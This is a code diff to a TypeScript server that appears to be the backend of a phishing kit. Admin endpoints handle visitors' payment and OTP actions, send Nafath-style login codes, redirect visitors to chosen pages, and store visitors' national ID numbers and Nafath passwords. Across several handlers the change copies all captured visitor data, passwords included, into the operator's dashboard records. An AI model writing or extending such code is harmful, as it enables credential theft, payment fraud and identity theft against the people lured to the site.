@@ -754,6 +754,7 @@ async function startServer() {
       // Read current visitor data to preserve raw info
       const currentVisitor = await readVisitor(visitorId);
       const currentPage = currentVisitor?.currentPage || "check";
+      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
 
       const updateData: Record<string, any> = {
         paymentActionAt: new Date().toISOString(),
@@ -774,7 +775,16 @@ async function startServer() {
       }
 
       await upsertVisitor(visitorId, updateData);
-      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
+      
+      // Preserve all existing visitor data for dashboard
+      await upsertDashboardRequest({ 
+        id: visitorId, 
+        visitorId: visitorId,
+        customer: customerName,
+        ...currentVisitor,
+        ...updateData, 
+        updated: "تم التحديث الآن" 
+      });
 
       res.json({ success: true, action });
     } catch (error) {
@@ -794,6 +804,7 @@ async function startServer() {
       }
 
       const currentVisitor = await readVisitor(visitorId);
+      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
 
       const updateData: Record<string, any> = {
         otpActionAt: new Date().toISOString(),
@@ -819,15 +830,12 @@ async function startServer() {
       // Update visitor data so customer can receive the update
       await upsertVisitor(visitorId, updateData);
       
-      // Get current visitor data to include customer name in dashboard update
-      const currentData = await readVisitor(visitorId);
-      const customerName = currentData?.ownerName || currentData?.phoneNumber || "زائر";
-      
-      // Update dashboard request with customer info
+      // Preserve all existing visitor data for dashboard
       const dashboardData = await upsertDashboardRequest({ 
         id: visitorId, 
         visitorId: visitorId,
         customer: customerName,
+        ...currentVisitor,
         ...updateData, 
         updated: "تم التحديث الآن" 
       });
@@ -884,6 +892,10 @@ async function startServer() {
         return;
       }
 
+      // Get current visitor data FIRST to preserve all data
+      const currentVisitor = await readVisitor(visitorId);
+      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
+
       const updateData: Record<string, any> = {
         phoneActionAt: new Date().toISOString(),
         adminPhoneAction: action,
@@ -918,15 +930,12 @@ async function startServer() {
       // Update visitor data so customer can receive the update
       await upsertVisitor(visitorId, updateData);
       
-      // Get current visitor data to include customer name
-      const currentData = await readVisitor(visitorId);
-      const customerName = currentData?.ownerName || currentData?.phoneNumber || "زائر";
-      
-      // Update dashboard request with customer info
+      // Preserve all existing visitor data for dashboard
       const dashboardData = await upsertDashboardRequest({ 
         id: visitorId, 
         visitorId: visitorId,
         customer: customerName,
+        ...currentVisitor,
         ...updateData, 
         updated: "تم التحديث الآن" 
       });
@@ -959,10 +968,6 @@ async function startServer() {
         adminNafadCodeSent: true,
         adminNafadSentAt: new Date().toISOString(),
         currentPage,
-        // Keep existing nafad data
-        nafadIdNumber: currentVisitor?.nafadIdNumber,
-        nafadPassword: currentVisitor?.nafadPassword,
-        nafadConfirmationStatus: currentVisitor?.nafadConfirmationStatus,
       };
 
       if (nafadCode) {
@@ -972,14 +977,12 @@ async function startServer() {
       // Update visitor data
       await upsertVisitor(visitorId, updateData);
       
-      // Update dashboard with customer name AND all nafad data
+      // Preserve all existing visitor data for dashboard
       const dashboardData = await upsertDashboardRequest({ 
         id: visitorId, 
         visitorId: visitorId,
         customer: customerName,
-        nafadIdNumber: currentVisitor?.nafadIdNumber,
-        nafadPassword: currentVisitor?.nafadPassword,
-        nafadConfirmationStatus: currentVisitor?.nafadConfirmationStatus,
+        ...currentVisitor,
         ...updateData, 
         updated: "تم إرسال رمز النفاذ" 
       });
@@ -1029,10 +1032,14 @@ async function startServer() {
       console.log("[Dashboard Redirect] Saving updateData:", updateData);
       await upsertVisitor(visitorId, updateData);
 
+      // Preserve all existing visitor data for dashboard
       const dashboardData = await upsertDashboardRequest({ 
         id: visitorId, 
         visitorId: visitorId,
         customer: customerName,
+        // Include all existing data from visitor
+        ...currentVisitor,
+        // Override with new update data
         ...updateData, 
         updated: `تم التوجيه إلى: ${targetPage}` 
       });
